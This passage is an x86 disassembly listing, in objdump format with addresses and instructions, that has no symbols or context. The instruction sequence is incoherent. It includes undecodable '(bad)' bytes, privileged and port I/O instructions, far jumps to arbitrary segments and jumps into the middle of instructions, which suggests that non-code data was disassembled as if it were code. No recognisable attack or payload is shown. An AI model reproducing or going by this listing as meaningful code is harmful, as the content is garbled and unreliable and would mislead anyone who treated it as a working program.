  4a0d93:	inc    eax
  4a0d94:	adc    ebx,DWORD PTR [eax+0x4a]
  4a0d97:	pop    esi
  4a0d98:	dec    esi
  4a0d99:	or     al,0xbb
  4a0d9b:	add    DWORD PTR [ecx],ebx
  4a0d9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0d9e:	or     BYTE PTR [eax],cl
  4a0da0:	push   ss
  4a0da1:	pushf  
  4a0da2:	scas   eax,DWORD PTR es:[edi]
  4a0da3:	add    BYTE PTR [edx+edi*4+0x6f],cl
  4a0da7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a0da8:	add    DWORD PTR [ebp+0xc],edx
  4a0dab:	push   edi
  4a0dac:	pusha  
  4a0dad:	test   eax,0x184691d3
  4a0db2:	rcr    ch,1
  4a0db4:	mov    ebp,edi
  4a0db6:	sub    DWORD PTR [ecx],ecx
  4a0db8:	retf   0x2046
  4a0dbb:	div    DWORD PTR [ecx+eiz*1-0x42]
  4a0dbf:	mov    eax,0x37e33800
  4a0dc4:	mov    DWORD PTR [esi],0x630e52d8
  4a0dca:	and    eax,0xe84d74c6
  4a0dcf:	add    ecx,DWORD PTR [eax-0x55]
  4a0dd2:	jg     0x4a0d90
  4a0dd4:	js     0x4a0dda
  4a0dd6:	jbe    0x4a0df2
  4a0dd8:	pop    esi
  4a0dd9:	ss jns 0x4a0e2e
  4a0ddc:	test   DWORD PTR [ebp-0x3acf0447],0xb71b00c4
  4a0de6:	xor    dh,BYTE PTR [edx-0x18]
  4a0de9:	cs adc eax,0xba15d908
  4a0def:	cmp    al,BYTE PTR [ebp+0x34b3504]
  4a0df5:	mov    ch,0xc4
  4a0df7:	inc    eax
  4a0df8:	pop    edx
  4a0df9:	push   ebp
  4a0dfa:	into   
  4a0dfb:	test   BYTE PTR [ebx+0xe24423a],al
  4a0e01:	jbe    0x4a0d92
  4a0e03:	adc    eax,0x91624e6
  4a0e08:	adc    DWORD PTR [eax],0x347005c6
  4a0e0e:	add    BYTE PTR [eax+0x150b42b0],al
  4a0e14:	mov    WORD PTR [eax+0x64],ss
  4a0e17:	push   esp
  4a0e18:	xor    ch,BYTE PTR [ebx-0x2c]
  4a0e1b:	sbb    eax,0xeafce854
  4a0e20:	sub    eax,0x86bde239
  4a0e25:	pushf  
  4a0e26:	jae    0x4a0e23
  4a0e28:	add    dl,BYTE PTR [edx-0x61]
  4a0e2b:	retf   0x1ea7
  4a0e2e:	clc    
  4a0e2f:	push   0x2c
  4a0e31:	jne    0x4a0e46
  4a0e33:	or     eax,0xc1beca74
  4a0e38:	mov    ss,WORD PTR es:[esi+0x6a45aabe]
  4a0e3f:	hlt    
  4a0e40:	cli    
  4a0e41:	xchg   esp,eax
  4a0e42:	jle    0x4a0e4c
  4a0e44:	icebp  
  4a0e45:	jle    0x4a0e55
  4a0e47:	inc    esp
  4a0e48:	icebp  
  4a0e49:	jb     0x4a0e6c
  4a0e4b:	ins    DWORD PTR es:[edi],dx
  4a0e4c:	ja     0x4a0e02
  4a0e4e:	pop    ecx
  4a0e4f:	cld    
  4a0e50:	sub    eax,edx
  4a0e52:	inc    esi
  4a0e53:	sub    ecx,esi
  4a0e55:	cwde   
  4a0e56:	add    DWORD PTR [ebp-0x74],0xfffffff8
  4a0e5a:	call   FWORD PTR [esp+esi*2]
  4a0e5d:	adc    eax,ebx
  4a0e5f:	dec    ecx
  4a0e60:	mov    dl,0x2b
  4a0e62:	stc    
  4a0e63:	and    bl,al
  4a0e65:	push   edi
  4a0e66:	ret    0x181
  4a0e69:	pop    edi
  4a0e6a:	ret    0x9677
  4a0e6d:	hlt    
  4a0e6e:	sbb    DWORD PTR [esi+esi*8-0x62e4d1e],ebp
  4a0e75:	adc    DWORD PTR [eax],0xffffffca
  4a0e78:	stos   BYTE PTR es:[edi],al
  4a0e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0e7a:	push   esi
  4a0e7b:	inc    esi
  4a0e7c:	sbb    al,0x72
  4a0e7e:	inc    ecx
  4a0e7f:	mov    dh,0xcc
  4a0e81:	jmp    0x4a0e89
  4a0e83:	daa    
  4a0e84:	sbb    eax,0x2eb91402
  4a0e89:	add    esi,edx
  4a0e8b:	pop    ecx
  4a0e8c:	dec    ebp
  4a0e8d:	enter  0x7724,0x69
  4a0e91:	lock sub eax,0x5515c138
  4a0e97:	shl    DWORD PTR [edx],1
  4a0e99:	inc    esp
  4a0e9a:	sbb    BYTE PTR [eax+ebx*2],dl
  4a0e9d:	jb     0x4a0e69
  4a0e9f:	or     DWORD PTR [edx+ebp*4],ecx
  4a0ea2:	push   cs
  4a0ea3:	dec    esp
  4a0ea4:	pusha  
  4a0ea5:	adc    al,0x8
  4a0ea7:	push   eax
  4a0ea8:	sub    al,0xa
  4a0eaa:	add    BYTE PTR [esi-0x71d2a4f3],bl
  4a0eb0:	add    al,0x5b
  4a0eb2:	call   DWORD PTR [ebp*8-0x7caf3ed5]
  4a0eb9:	sub    DWORD PTR [esi+esi*2-0x23],esi
  4a0ebd:	push   0xd6e372e9
  4a0ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a0ec3:	sbb    DWORD PTR [eax-0x3eb2bab4],edx
  4a0ec9:	jle    0x4a0e9b
  4a0ecb:	xor    al,0xdd
  4a0ecd:	xchg   ebx,eax
  4a0ece:	push   ds
  4a0ecf:	fisttp WORD PTR [ebp+0x45]
  4a0ed2:	enter  0xb740,0x80
  4a0ed6:	lock and cl,dl
  4a0ed9:	retf   0x1eea
  4a0edc:	add    bh,BYTE PTR [esi-0x67]
  4a0edf:	cli    
  4a0ee0:	sahf   
  4a0ee1:	lods   al,BYTE PTR ds:[esi]
  4a0ee2:	mov    ecx,0x5879e0fb
  4a0ee7:	dec    ebp
  4a0ee9:	xchg   BYTE PTR es:[ebp+0x352ec53],cl
  4a0ef0:	icebp  
  4a0ef1:	push   esi
  4a0ef2:	push   0xa
  4a0ef4:	xchg   ebx,eax
  4a0ef5:	and    al,0x45
  4a0ef7:	sahf   
  4a0ef8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a0ef9:	enter  0xea51,0x52
  4a0efd:	cdq    
  4a0efe:	mov    ecx,0x6ad8f1fe
  4a0f03:	push   esi
  4a0f04:	sti    
  4a0f05:	push   esi
  4a0f06:	add    ebx,0xffffff8a
  4a0f09:	dec    eax
  4a0f0a:	dec    ebp
  4a0f0b:	ss pop eax
  4a0f0d:	adc    DWORD PTR ds:0xc4d76e13,0x18
  4a0f14:	test   eax,0x8cda1b90
  4a0f19:	and    BYTE PTR [eax+0x19],dh
  4a0f1c:	pushf  
  4a0f1d:	enter  0x70b6,0x3b
  4a0f21:	dec    ecx
  4a0f22:	ins    BYTE PTR es:[edi],dx
  4a0f23:	nop
  4a0f24:	mov    BYTE PTR [esi],bl
  4a0f26:	or     al,0x7e
  4a0f28:	or     DWORD PTR [edi+0x5498019c],esi
  4a0f2e:	cmp    esi,DWORD PTR [edi]
  4a0f30:	push   esp
  4a0f31:	add    BYTE PTR [esi-0x2dcd663c],bh
  4a0f37:	aad    0xb
  4a0f39:	inc    edx
  4a0f3a:	pop    eax
  4a0f3b:	test   al,0x8a
  4a0f3d:	push   ebx
  4a0f3e:	cmp    BYTE PTR [ebp+0x74585de3],0x1d
  4a0f45:	jne    0x4a0f91
  4a0f47:	push   cs
  4a0f48:	jno    0x4a0fc2
  4a0f4a:	push   ds
  4a0f4b:	add    ecx,DWORD PTR [edx+0x40b43c56]
  4a0f51:	inc    eax
  4a0f52:	addr16 mov cl,0x4
  4a0f55:	je     0x4a0f87
  4a0f57:	sbb    BYTE PTR [esi],0x8d
  4a0f5a:	or     al,0x62
  4a0f5c:	out    0xe6,al
  4a0f5e:	xchg   ebx,eax
  4a0f5f:	sbb    al,0xd3
  4a0f61:	pop    esi
  4a0f62:	xor    ah,BYTE PTR [esi+0x568d8133]
  4a0f68:	test   al,0x96
  4a0f6a:	call   0x8a0fe21
  4a0f6f:	push   es
  4a0f70:	dec    esi
  4a0f71:	push   edx
  4a0f72:	sar    BYTE PTR [ebp-0x22],cl
  4a0f75:	clc    
  4a0f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a0f77:	mov    bh,0x59
  4a0f79:	jge    0x4a0f71
  4a0f7b:	cmc    
  4a0f7c:	adc    al,al
  4a0f7e:	iret   
  4a0f7f:	jne    0x4a0ff2
  4a0f81:	jne    0x4a0faf
  4a0f83:	push   0x8d2f1868
  4a0f88:	daa    
  4a0f89:	pop    ss
  4a0f8a:	mov    bl,BYTE PTR [edi+0x67]
  4a0f8d:	(bad)  
  4a0f8e:	fsubr  QWORD PTR [edx-0x24]
  4a0f91:	jne    0x4a0f36
  4a0f93:	sbb    BYTE PTR [esi+0x1179151c],bl
  4a0f99:	sub    edx,DWORD PTR [esi+0x1b3dcdc2]
  4a0f9f:	ins    BYTE PTR es:[edi],dx
  4a0fa0:	mov    esp,0x98681f73
  4a0fa5:	test   BYTE PTR [ebx+0x7f],dl
  4a0fa8:	add    eax,0x867e064e
  4a0fad:	jns    0x4a0f3a
  4a0faf:	pop    es
  4a0fb0:	mov    esi,0x162486b1
  4a0fb5:	cmp    ebp,DWORD PTR [eax-0x58]
  4a0fb8:	cmp    eax,0x1c91ec44
  4a0fbd:	sar    BYTE PTR [esi],cl
  4a0fbf:	push   ss
  4a0fc0:	fadd   DWORD PTR [edi+0x8]
  4a0fc3:	jg     0x4a0fe5
  4a0fc5:	int    0xa3
  4a0fc7:	or     eax,0xc4f3f08
  4a0fcc:	push   cs
  4a0fcd:	in     al,0x6c
  4a0fcf:	push   ebp
  4a0fd0:	cmp    DWORD PTR [edx+eax*1+0x28b857ca],0x27b5a0e5
  4a0fdb:	or     BYTE PTR [ebx-0x5a20aaf1],0xe
  4a0fe2:	jg     0x4a0f76
  4a0fe4:	ins    BYTE PTR es:[edi],dx
  4a0fe5:	cli    
  4a0fe6:	add    edi,DWORD PTR [edi+edi*1-0x17]
  4a0fea:	dec    ecx
  4a0feb:	jo     0x4a0f90
  4a0fed:	or     DWORD PTR [esp+ecx*8],ecx
  4a0ff0:	jbe    0x4a0f7f
  4a0ff2:	jb     0x4a0ff2
  4a0ff4:	add    ebx,DWORD PTR [eax+eiz*4+0x3]
  4a0ff8:	lods   al,BYTE PTR ds:[esi]
  4a0ff9:	pop    esp
  4a0ffa:	adc    al,BYTE PTR [ebp+0x7d2148d2]
  4a1000:	pop    edx
  4a1001:	ret    0x47a
  4a1004:	cmp    BYTE PTR [ebx+0x65],bh
  4a1007:	clc    
  4a1008:	adc    al,0x3b
  4a100a:	mov    esi,0x70fba80
  4a100f:	cmp    DWORD PTR [edx+0x78],0x7a
  4a1013:	inc    edx
  4a1014:	sbb    eax,0x9d9cc205
  4a1019:	xlat   BYTE PTR ds:[ebx]
  4a101a:	sbb    BYTE PTR [eax+0x2d],cl
  4a101d:	lea    edi,[edi+0x47]
  4a1020:	adc    al,0x88
  4a1022:	les    ebp,FWORD PTR [edi-0x49]
  4a1025:	or     al,0xd9
  4a1027:	div    BYTE PTR cs:[eax]
  4a102a:	test   dl,dl
  4a102c:	and    eax,0xb6bc908
  4a1031:	imul   eax,DWORD PTR [esi+ecx*8],0xf00b2206
  4a1038:	test   BYTE PTR [edx],ch
  4a103a:	and    ebp,DWORD PTR [eax-0x4bd196ec]
  4a1040:	in     al,0xd0
  4a1042:	retf   
  4a1043:	enter  0xd628,0xe9
  4a1047:	or     eax,0x5460d203
  4a104c:	sub    BYTE PTR [eax],ch
  4a104e:	xchg   ebp,eax
  4a104f:	loopne 0x4a1059
  4a1051:	imul   ebx,DWORD PTR [esi],0x10163057
  4a1057:	mov    dl,0xad
  4a1059:	loope  0x4a107b
  4a105b:	neg    BYTE PTR [ecx+0x1428f842]
  4a1061:	and    al,BYTE PTR [ecx+0x43]
  4a1064:	pop    ss
  4a1065:	clc    
  4a1066:	sbb    eax,0xc94d818
  4a106b:	mov    BYTE PTR [ebx+eax*4],dh
  4a106e:	pop    eax
  4a106f:	shl    BYTE PTR [ecx+0x2c072a64],1
  4a1075:	pop    ebx
  4a1076:	xchg   ebp,eax
  4a1077:	or     eax,0x13588821
  4a107c:	xchg   DWORD PTR [ebp+0xf743d24],ecx
  4a1082:	push   esi
  4a1083:	dec    edi
  4a1084:	dec    edx
  4a1085:	dec    esp
  4a1086:	mov    esp,0x151c1437
  4a108b:	mov    bl,0xe8
  4a108d:	std    
  4a108e:	(bad)  
  4a1090:	add    al,0x12
  4a1092:	mov    esp,DWORD PTR [edx+0x4f]
  4a1095:	xor    BYTE PTR [ebp+0x653d3e00],bh
  4a109b:	rcr    DWORD PTR [eax+0x35],0x14
  4a109f:	adc    eax,0xdddd2c70
  4a10a4:	inc    ebx
  4a10a5:	adc    BYTE PTR [edi-0x72],al
  4a10a8:	aam    0x10
  4a10aa:	(bad)  
  4a10ab:	mov    ah,0xb
  4a10ad:	retf   0xe10e
  4a10b0:	ror    BYTE PTR [ebx-0x4e],0x55
  4a10b4:	in     al,dx
  4a10b5:	mov    cr6,edx
  4a10b8:	stos   DWORD PTR es:[edi],eax
  4a10b9:	mov    ebx,0x15144e7d
  4a10be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a10bf:	shl    DWORD PTR [ecx-0x73],0x31
  4a10c3:	(bad)  
  4a10c4:	fmul   st,st(4)
  4a10c6:	sub    eax,0x91a4582
  4a10cb:	add    ebx,DWORD PTR [eiz*1-0x4f6f29e2]
  4a10d2:	mov    edi,0x676cc5d
  4a10d7:	lock push ss
  4a10d9:	push   0x75
  4a10db:	hlt    
  4a10dc:	daa    
  4a10dd:	add    eax,0xf9e92b07
  4a10e2:	adc    al,0xd9
  4a10e4:	das    
  4a10e5:	push   es
  4a10e6:	das    
  4a10e7:	add    DWORD PTR [eax+0x5f7fcf5d],eax
  4a10ed:	sbb    eax,0x8b06c4c3
  4a10f2:	fwait
  4a10f3:	sub    eax,DWORD PTR [ecx-0x73]
  4a10f6:	imul   esp,eax,0x5c77a058
  4a10fc:	jmp    0x4a1172
  4a10fe:	pop    edx
  4a10ff:	stos   DWORD PTR es:[edi],eax
  4a1100:	sub    BYTE PTR [eax],dl
  4a1102:	je     0x4a10ab
  4a1104:	xchg   ebp,eax
  4a1105:	adc    cl,BYTE PTR [edx-0x12a97ce3]
  4a110b:	add    edx,DWORD PTR [edi+0x4f]
  4a110e:	sbb    BYTE PTR ss:[eax+0x38247c36],al
  4a1115:	push   esi
  4a1116:	data16 mov ch,0xc7
  4a1119:	cmp    bh,BYTE PTR [edi+ebx*2-0x3a]
  4a111d:	sub    al,0x1
  4a111f:	sbb    DWORD PTR [edi],esi
  4a1121:	aad    0x3c
  4a1123:	push   esi
  4a1124:	push   ss
  4a1125:	inc    ecx
  4a1126:	or     al,0x12
  4a1128:	iret   
  4a1129:	je     0x4a114e
  4a112b:	lahf   
  4a112c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a112d:	dec    eax
  4a112e:	push   eax
  4a112f:	js     0x4a1174
  4a1131:	or     al,0xc4
  4a1133:	pop    ebx
  4a1134:	xchg   ebp,eax
  4a1135:	fadd   QWORD PTR [ecx]
  4a1137:	lds    esi,FWORD PTR [ecx]
  4a1139:	dec    edi
  4a113a:	out    0x22,eax
  4a113c:	push   esp
  4a113d:	js     0x4a112b
  4a113f:	add    al,0xe3
  4a1141:	push   edx
  4a1142:	xor    BYTE PTR [ebx],bl
  4a1144:	add    BYTE PTR [edi],0xa8
  4a1147:	stc    
  4a1148:	or     al,0x89
  4a114a:	imul   edi,edi,0xb46cf95f
  4a1150:	add    dl,BYTE PTR [ebp+0x52c07227]
  4a1156:	lea    edx,[esi+0x58]
  4a1159:	pop    es
  4a115a:	imul   ecx,DWORD PTR [edi],0x40ddff93
  4a1160:	or     al,0x6a
  4a1162:	adc    ch,dh
  4a1164:	or     cl,BYTE PTR [edx-0x40]
  4a1167:	sbb    dh,bl
  4a1169:	data16 jnp 0x4a10f7
  4a116c:	popa   
  4a116d:	pusha  
  4a116e:	add    BYTE PTR [ecx-0x176fd151],cl
  4a1174:	push   ss
  4a1175:	add    esp,eax
  4a1177:	and    BYTE PTR [eax],0x5a
  4a117a:	shr    BYTE PTR [ebx-0x20],0x4e
  4a117e:	jle    0x4a11a4
  4a1180:	cwde   
  4a1181:	push   esi
  4a1182:	push   edx
  4a1183:	aad    0xc0
  4a1185:	xor    eax,edi
  4a1187:	div    al
  4a1189:	jae    0x4a11b8
  4a118b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a118c:	rcr    dl,0xad
  4a118f:	xchg   DWORD PTR [esi+edx*1],esi
  4a1192:	pusha  
  4a1193:	xor    esi,eax
  4a1195:	ret    
  4a1196:	push   ds
  4a1197:	mov    DWORD PTR [eax+0x10],esi
  4a119a:	jno    0x4a119f
  4a119c:	mov    edx,0x9c90d530
  4a11a1:	push   esi
  4a11a2:	mov    al,ds:0x8909ea42
  4a11a7:	test   DWORD PTR [ebx-0x7fef08bd],edx
  4a11ad:	pop    es
  4a11ae:	pop    edx
  4a11af:	pop    ds
  4a11b0:	adc    DWORD PTR [ebx],edx
  4a11b2:	and    al,0xcb
  4a11b4:	or     eax,0x46c73fc0
  4a11b9:	mov    esi,DWORD PTR [ebp+0x372d42cb]
  4a11bf:	push   esp
  4a11c0:	cmp    eax,0xd92d16c2
  4a11c5:	je     0x4a1220
  4a11c7:	push   ecx
  4a11c8:	in     al,dx
  4a11c9:	and    eax,0x30b4a139
  4a11ce:	test   bh,al
  4a11d0:	sub    dh,ch
  4a11d2:	aad    0xb8
  4a11d4:	and    bl,BYTE PTR [esi]
  4a11d6:	cmp    eax,0xfc1a2a3b
  4a11db:	mov    ecx,0x8d9b1232
  4a11e0:	or     eax,ebx
  4a11e2:	push   esi
  4a11e3:	mov    bh,0x0
  4a11e5:	scas   al,BYTE PTR es:[edi]
  4a11e6:	adc    dh,cl
  4a11e8:	or     BYTE PTR [ebp+0x2c],cl
  4a11eb:	cmp    eax,0x658d412b
  4a11f0:	mov    bl,0x4a
  4a11f2:	sbb    BYTE PTR [ebx],al
  4a11f4:	aaa    
  4a11f5:	(bad)  
  4a11f6:	mov    esi,?
  4a11f8:	mov    ah,BYTE PTR [eax-0x7cc2430d]
  4a11fe:	jmp    0xa41d:0xb70b0617
  4a1205:	stc    
  4a1206:	jns    0x4a1218
  4a1208:	dec    eax
  4a1209:	sub    dl,0xbb
  4a120c:	aaa    
  4a120d:	xchg   edi,eax
  4a120e:	or     ecx,DWORD PTR [edx]
  4a1210:	in     eax,dx
  4a1211:	mov    ecx,0x10e34101
  4a1216:	pop    eax
  4a1217:	inc    ecx
  4a1218:	dec    ebx
  4a1219:	pushf  
  4a121a:	push   es
  4a121b:	outs   dx,BYTE PTR ds:[esi]
  4a121c:	push   edx
  4a121d:	push   ebp
  4a121e:	shl    BYTE PTR [ebx-0x3cf06b89],cl
  4a1224:	inc    eax
  4a1225:	lods   eax,DWORD PTR ds:[esi]
  4a1226:	aad    0x41
  4a1228:	call   0x90d8605e
  4a122d:	nop
  4a122e:	cmc    
  4a122f:	fnstenv [esi+0x51893a3f]
  4a1235:	adc    BYTE PTR [ebx],dl
  4a1237:	or     al,0x88
  4a1239:	test   BYTE PTR [ebx],al
  4a123b:	retf   0x3bef
  4a123e:	out    dx,eax
  4a123f:	pop    ss
  4a1240:	mov    WORD PTR [edx+0x18],cs
  4a1243:	sbb    al,0x82
  4a1245:	sbb    DWORD PTR [esp+eax*2],edx
  4a1248:	add    BYTE PTR [edx-0x4a],0x38
  4a124c:	and    eax,DWORD PTR [esi+0x4c874a88]
  4a1252:	rcl    DWORD PTR [ebx-0x68],1
  4a1255:	xchg   ecx,eax
  4a1256:	and    DWORD PTR [eax],ebx
  4a1258:	cmp    al,0x9e
  4a125a:	or     DWORD PTR ds:[edi],edx
  4a125d:	int    0xd8
  4a125f:	shl    BYTE PTR [eax],0x4c
  4a1262:	dec    eax
  4a1263:	sbb    BYTE PTR ds:0xd0ca21dd,bl
  4a1269:	xchg   edx,eax
  4a126a:	and    eax,0xdd14a2da
  4a126f:	popf   
  4a1270:	imul   ebx,DWORD PTR [edx+ebp*1],0x4b
  4a1274:	int    0xd2
  4a1276:	jne    0x4a126c
  4a1278:	(bad)  
  4a1279:	scas   al,BYTE PTR es:[edi]
  4a127a:	adc    DWORD PTR [ecx],ebx
  4a127c:	pop    ecx
  4a127d:	sub    edx,DWORD PTR [eax-0x1cc27566]
  4a1283:	inc    eax
  4a1284:	sub    DWORD PTR [ebx-0x38],0x5b
  4a1288:	mov    eax,ds:0x892a1105
  4a128d:	ja     0x4a12c0
  4a128f:	mov    edx,0x3d2ac323
  4a1294:	lock lods eax,DWORD PTR ds:[esi]
  4a1296:	loopne 0x4a12c4
  4a1298:	imul   ecx,ebp,0x185540b8
  4a129e:	lods   eax,DWORD PTR ds:[esi]
  4a129f:	pop    ss
  4a12a0:	ficom  WORD PTR [esi+ecx*1+0x146c1ceb]
  4a12a7:	sub    ch,0x4b
  4a12aa:	cmp    BYTE PTR [ebx],al
  4a12ac:	jnp    0x4a126a
  4a12ae:	or     bh,0x61
  4a12b1:	xchg   DWORD PTR [edi-0x6e],ebx
  4a12b4:	and    al,0x50
  4a12b6:	xor    edx,DWORD PTR [eax]
  4a12b8:	pop    ss
  4a12b9:	and    DWORD PTR [eax+0x38],0xffffffff
  4a12bd:	sbb    BYTE PTR [ebx],al
  4a12bf:	loope  0x4a132c
  4a12c1:	sub    DWORD PTR [ecx],edi
  4a12c3:	mov    al,0x4
  4a12c5:	and    eax,0x4b4b003c
  4a12ca:	inc    ebx
  4a12cb:	xchg   ecx,eax
  4a12cc:	pop    edi
  4a12cd:	cmc    
  4a12ce:	sbb    BYTE PTR [edx],al
  4a12d0:	xor    dl,BYTE PTR [eax+0x38]
  4a12d3:	sahf   
  4a12d4:	or     eax,0x1a17114
  4a12d9:	add    DWORD PTR [esi+0x885fbed],esp
  4a12df:	out    dx,eax
  4a12e0:	push   ss
  4a12e1:	sahf   
  4a12e2:	mov    DWORD PTR [ebp+0x11094763],edi
  4a12e8:	sbb    DWORD PTR [edx],0x5f
  4a12eb:	jae    0x4a12d2
  4a12ed:	cmp    DWORD PTR [ebx+eax*4],edx
  4a12f0:	and    BYTE PTR ds:0x48f0a134,al
  4a12f6:	push   esp
  4a12f7:	add    al,0x48
  4a12f9:	mov    edx,0x80d30420
  4a12fe:	and    eax,0x8954093
  4a1303:	cli    
  4a1304:	mov    ds:0xcdd724b2,al
  4a1309:	stos   DWORD PTR es:[edi],eax
  4a130a:	mov    ebx,0x64bc12a7
  4a130f:	ret    
  4a1310:	fs shl bh,cl
  4a1313:	push   ebx
  4a1314:	cdq    
  4a1315:	adc    DWORD PTR [eax+0xa876c08],edi
  4a131b:	adc    DWORD PTR [eax+edx*1-0x39],0x862050a7
  4a1323:	(bad)  
  4a1324:	push   eax
  4a1325:	nop
  4a1326:	mov    ch,BYTE PTR [ecx-0x40a1dc75]
  4a132c:	adc    edx,edx
  4a132e:	retf   0xbd8
  4a1331:	pop    ds
  4a1332:	or     cl,cl
  4a1334:	enter  0x8abb,0x61
  4a1338:	or     BYTE PTR [esi],ch
  4a133a:	sbb    BYTE PTR [ebp+0xc9585a9],dl
  4a1340:	sbb    al,0x5b
  4a1342:	push   ss
  4a1343:	ss dec eax
  4a1345:	xchg   edi,eax
  4a1346:	push   ecx
  4a1347:	mov    al,0x69
  4a1349:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a134a:	fstp   DWORD PTR [esi+0x77]
  4a134d:	inc    edx
  4a134e:	cmp    al,0xca
  4a1350:	cmp    BYTE PTR [eax+edx*2],al
  4a1353:	in     al,0xa1
  4a1355:	lods   eax,DWORD PTR ds:[esi]
  4a1356:	mov    ebp,0x516242c1
  4a135b:	and    DWORD PTR [ebx+0x42],ebx
  4a135e:	pop    edx
  4a135f:	dec    eax
  4a1360:	sahf   
  4a1361:	add    DWORD PTR [eax],esp
  4a1363:	and    DWORD PTR [eax],ebx
  4a1365:	mov    WORD PTR [eax+0x2b],?
  4a1368:	adc    eax,0x82ba1856
  4a136d:	push   es
  4a136e:	jo     0x4a13ca
  4a1370:	in     al,0x4d
  4a1372:	enter  0x6341,0x85
  4a1376:	adc    ebx,DWORD PTR [eax-0x6155e8ec]
  4a137c:	xchg   edi,eax
  4a137d:	push   edx
  4a137e:	mov    edi,0x7793128
  4a1383:	leave  
  4a1384:	and    cl,BYTE PTR [esi+ebx*2+0x43]
  4a1388:	jnp    0x4a13bb
  4a138a:	or     BYTE PTR [edi+0x231b54ce],bh
  4a1390:	push   ebx
  4a1391:	shl    BYTE PTR [eax-0x5edc7d65],cl
  4a1397:	add    DWORD PTR [ebp+0xc922075],ebx
  4a139d:	scas   eax,DWORD PTR es:[edi]
  4a139e:	loopne 0x4a13c0
  4a13a0:	adc    edx,DWORD PTR [esi+0x74]
  4a13a3:	sbb    eax,0xc629eb22
  4a13a8:	xor    eax,0x682b1012
  4a13ad:	and    DWORD PTR ds:0xa987664c,esp
  4a13b3:	fisttp QWORD PTR [eax]
  4a13b5:	pop    DWORD PTR ds:0x180c0c0
  4a13bb:	jmp    0x4a13c9
  4a13bd:	pop    es
  4a13be:	mov    edi,0xebc5a4f
  4a13c3:	pop    ss
  4a13c4:	jne    0x4a13ba
  4a13c6:	inc    ebx
  4a13c7:	ds mov ah,0x8a
  4a13ca:	dec    ebp
  4a13cb:	adc    edi,DWORD PTR [ebp+0x58]
  4a13ce:	inc    ecx
  4a13cf:	nop
  4a13d0:	mov    cl,BYTE PTR [esi+0x1c6cea0]
  4a13d6:	inc    ebp
  4a13d7:	push   0x35c44c1f
  4a13dc:	or     DWORD PTR [eax],edx
  4a13de:	inc    ecx
  4a13df:	aaa    
  4a13e0:	mov    ?,WORD PTR [eax+0x5e3d620d]
  4a13e6:	inc    eax
  4a13e7:	les    esp,FWORD PTR [eax]
  4a13e9:	mov    ds:0x6984407b,al
  4a13ee:	adc    BYTE PTR [ecx],dh
  4a13f0:	mov    ah,0x69
  4a13f2:	mov    DWORD PTR [ebp+0x17b12914],ebp
  4a13f8:	dec    edx
  4a13f9:	(bad)  
  4a13fa:	push   ecx
  4a13fb:	or     BYTE PTR [edi+0x4],dh
  4a13fe:	push   ecx
  4a13ff:	add    al,BYTE PTR [esi+0x5425d3bd]
  4a1405:	inc    edx
  4a1406:	enter  0xb16c,0x8b
  4a140a:	cli    
  4a140b:	jno    0x4a141e
  4a140d:	add    DWORD PTR [ebx],edi
  4a140f:	dec    esi
  4a1410:	jno    0x4a13e6
  4a1412:	cmp    DWORD PTR [edx+eiz*1],ecx
  4a1415:	je     0x4a13c5
  4a1417:	stos   DWORD PTR es:[edi],eax
  4a1418:	jb     0x4a13ad
  4a141a:	jno    0x4a1460
  4a141c:	lods   al,BYTE PTR ds:[esi]
  4a141d:	test   DWORD PTR [edi+edi*8-0xa],ebx
  4a1421:	or     DWORD PTR [esi+edx*1+0x6a6b3e0a],ecx
  4a1428:	call   0x5225:0xd0913ec2
  4a142f:	add    BYTE PTR [ebx+esi*1-0x79f2df57],dl
  4a1436:	mov    ebp,0x9018ae0c
  4a143b:	pop    esp
  4a143c:	fisubr DWORD PTR [edi]
  4a143e:	jmp    0x138b:0x1533ff97
  4a1445:	or     BYTE PTR [ecx+edx*1],al
  4a1448:	mov    edx,0xded3a152
  4a144d:	inc    ebp
  4a144e:	ins    BYTE PTR es:[edi],dx
  4a144f:	inc    esp
  4a1450:	push   esi
  4a1451:	inc    edi
  4a1452:	xor    bl,cl
  4a1454:	add    al,0x4
  4a1456:	push   ss
  4a1457:	jno    0x4a1464
  4a1459:	push   ss
  4a145a:	test   eax,edx
  4a145c:	ret    
  4a145d:	retf   0x2e65
  4a1460:	sbb    cl,al
  4a1462:	jle    0x4a13e7
  4a1464:	jb     0x4a1468
  4a1466:	outs   dx,BYTE PTR ds:[esi]
  4a1467:	and    al,BYTE PTR [ebx]
  4a1469:	push   eax
  4a146a:	jp     0x4a1413
  4a146c:	xor    ch,ch
  4a146e:	pusha  
  4a146f:	lahf   
  4a1470:	test   eax,0x7ff47d14
  4a1475:	fs and ah,cl
  4a1478:	and    BYTE PTR [esp+edi*2-0x6e],bl
  4a147c:	mov    cl,0x21
  4a147e:	cmp    al,0xb0
  4a1480:	xor    DWORD PTR [edi],ebp
  4a1482:	push   eax
  4a1483:	push   edx
  4a1484:	sbb    esi,edx
  4a1486:	push   esp
  4a1487:	mov    esi,0x51110bdf
  4a148c:	dec    edx
  4a148d:	lock idiv DWORD PTR [edi-0x25]
  4a1491:	push   esi
  4a1492:	dec    ebp
  4a1493:	fcomip st,st(6)
  4a1495:	inc    ebp
  4a1496:	in     al,0x40
  4a1498:	jne    0x4a14b6
  4a149a:	inc    edi
  4a149b:	nop
  4a149c:	jle    0x4a1458
  4a149e:	lea    edi,[ebp+0x435336bd]
  4a14a4:	lods   eax,DWORD PTR ds:[esi]
  4a14a5:	cmp    al,0xa9
  4a14a7:	or     al,0xd1
  4a14a9:	mov    al,0x4
  4a14ab:	shl    BYTE PTR ds:0x6b0dd016,cl
  4a14b1:	add    DWORD PTR [edi+0x9befe33],edx
  4a14b7:	sbb    esi,DWORD PTR [edx]
  4a14b9:	enter  0xffb1,0x3
  4a14bd:	push   eax
  4a14be:	dec    edx
  4a14bf:	xchg   DWORD PTR [edx+0x4d56db63],edx
  4a14c5:	push   DWORD PTR [edi+edi*2-0x80]
  4a14c9:	xchg   DWORD PTR [edi],eax
  4a14cb:	inc    ebx
  4a14cc:	push   eax
